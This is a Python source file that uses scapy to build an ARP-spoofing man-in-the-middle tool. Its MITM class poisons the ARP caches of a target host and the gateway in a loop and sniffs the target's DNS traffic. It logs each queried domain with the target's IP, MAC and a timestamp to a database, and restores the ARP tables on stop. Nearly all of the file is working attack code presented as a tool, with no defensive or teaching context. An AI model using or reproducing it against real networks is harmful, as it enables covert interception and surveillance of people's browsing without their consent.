from scapy.layers.l2 import ARP
from scapy.packet import Padding
from scapy.layers.dns import DNS
from scapy.layers.inet import TCP, IP, Ether
from scapy.sendrecv import AsyncSniffer, sendp
from Host import Host
from Helper import *
from DatabaseLog import DatabaseLog
from time import sleep
from threading import Thread
from datetime import datetime

class MITM: #this class will handle the spoofing and releasing for the targets pluss sniffing and routing 
    def __init__(self,target_host,gateway_host,interface):
        self.target_host=target_host
        self.gateway_host=gateway_host
        self.interface=interface
        self._database_log = DatabaseLog()
        self._stopped=False
        self._spoofing_thread=Thread(target=self.arp_spoof)
        self._sniffing_thread = AsyncSniffer(iface=interface,
                                            filter="port 53 and ether dst {0}".format(self.target_host.mac),
                                            prn=lambda x: self.DNSquerysniff(x),
                                            store=0
                                            )
        self._routing_lookup = {self.target_host.mac:self.gateway_host.mac,self.gateway_host.mac:self.target_host.mac}
        self._sniffing_thread.start()
        self._spoofing_thread.start()
        


    def stop_attack(self):
        self._stopped=True
        self._sniffing_thread.stop()
        self._spoofing_thread.join(timeout=3)
        self.arp_restore()
        self._database_log.close()
        print("stopped the Man in the Middel Attack on {0}".format(self.target_host.ip))


    def arp_spoof(self):  #it takes gateway host and target host
        spoof_socket=get_l2socket(self.interface)
        arp_target_packet= Ether(dst=self.target_host.mac) / ARP(op=2,psrc=self.gateway_host.ip,pdst=self.target_host.ip,hwdst=self.target_host.mac)
        arp_gateway_packet= Ether(dst=self.gateway_host.mac) / ARP(op=2,psrc=self.target_host.ip,pdst=self.gateway_host.ip, hwdst=self.gateway_host.mac)
        print("Poisining target {0}".format(self.target_host.ip))
        while not self._stopped:#send spoofed packets every 2. seconds
            spoof_socket.send(arp_target_packet)
            spoof_socket.send(arp_gateway_packet)
            sleep(3)
        spoof_socket.close()
        

    def arp_restore(self):
        restoring_socket=get_l2socket(self.interface)
        print ("Restoring target... {0}".format(self.target_host.ip)) # slightly different method using send
        arp_target_packet = Ether(src=self.target_host.mac, dst=self.gateway_host.mac) / ARP(op=2,psrc=self.target_host.ip,pdst=self.gateway_host.ip,hwsrc=self.target_host.mac,hwdst="ff:ff:ff:ff:ff:ff")
        arp_gateway_packet = Ether(src=self.gateway_host.mac, dst=self.target_host.mac) / ARP(op=2,psrc=self.gateway_host.ip,pdst=self.target_host.ip,hwsrc=self.gateway_host.mac,hwdst="ff:ff:ff:ff:ff:ff")
        for i in range(3):
            restoring_socket.send(arp_gateway_packet)
            restoring_socket.send(arp_target_packet)
        restoring_socket.close()

    def DNSquerysniff(self,pkt):
        dns_pkt = pkt[DNS]
        if dns_pkt.qr == 1 and dns_pkt.qd.qtype == 1:
            website=str(dns_pkt.qd.qname,'utf-8')
            row=(website,self.target_host.ip,self.target_host.mac,datetime.now().strftime("%d/%m/%Y %H:%M:%S"),) #log the quey in the database
            self._database_log.insert_one(row)

    


